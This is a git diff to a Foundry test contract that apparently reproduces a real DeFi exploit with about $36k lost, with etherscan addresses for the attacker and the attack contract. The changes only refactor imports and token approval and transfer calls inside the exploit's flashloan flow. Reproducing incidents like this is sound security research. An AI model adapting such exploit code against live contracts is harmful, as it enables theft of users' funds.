@@ -3,6 +3,15 @@ pragma solidity ^0.8.10;
 
 import "forge-std/Test.sol";
 
+import {IERC20Metadata as IERC20} from "src/interfaces/IERC20Metadata.sol";
+
+import {IWETH} from "src/interfaces/IWETH.sol";
+import {crETH} from "src/interfaces/crETH.sol";
+import {ICErc20Delegate} from "src/interfaces/ICErc20Delegate.sol";
+import {ICointroller} from "src/interfaces/ICointroller.sol";
+import {IBalancerVault} from "src/interfaces/IBalancerVault.sol";
+import {IAaveFlashloan} from "src/interfaces/IAaveFlashloan.sol";
+import {SafeERC20 as TransferHelper} from "src/interfaces/SafeERC20.sol";
 // @KeyInfo - Total Lost : ~$36k USD$
 // Attacker : https://etherscan.io/address/0xccc526e2433db1eebb9cbf6acd7f03a19408278c
 // Attack Contract : https://etherscan.io/address/0x915dff6707bea63daea1b41aa5d37353229066ba
@@ -112,10 +121,10 @@ contract ContractTest is Test {
         LP.approve(address(Curve3POOL), type(uint256).max);
         USDC.approve(address(Curve3POOL), type(uint256).max);
         DAI.approve(address(Curve3POOL), type(uint256).max);
-        TransferHelper.safeApprove(address(USDT), address(Curve3POOL), type(uint256).max);
-        TransferHelper.safeApprove(address(USDT), address(cUSDT), type(uint256).max);
-        TransferHelper.safeApprove(address(USDT), address(aaveV2), type(uint256).max);
-        TransferHelper.safeApprove(address(USDT), address(aaveV3), type(uint256).max);
+        TransferHelper.safeIncreaseAllowance(USDT, address(Curve3POOL), type(uint256).max);
+        TransferHelper.safeIncreaseAllowance(USDT, address(cUSDT), type(uint256).max);
+        TransferHelper.safeIncreaseAllowance(USDT, address(aaveV2), type(uint256).max);
+        TransferHelper.safeIncreaseAllowance(USDT, address(aaveV3), type(uint256).max);
 
         uint256[3] memory amount;
         amount[0] = 0;
@@ -149,7 +158,7 @@ contract ContractTest is Test {
 
         IERC20(tokens[0]).transfer(msg.sender, amounts[0] + feeAmounts[0]);
         IERC20(tokens[1]).transfer(msg.sender, amounts[1] + feeAmounts[1]);
-        TransferHelper.safeTransfer(tokens[2], msg.sender, amounts[2] + feeAmounts[2]);
+        TransferHelper.safeTransfer(IERC20(tokens[2]), msg.sender, amounts[2] + feeAmounts[2]);
     }
 
     receive() external payable {}
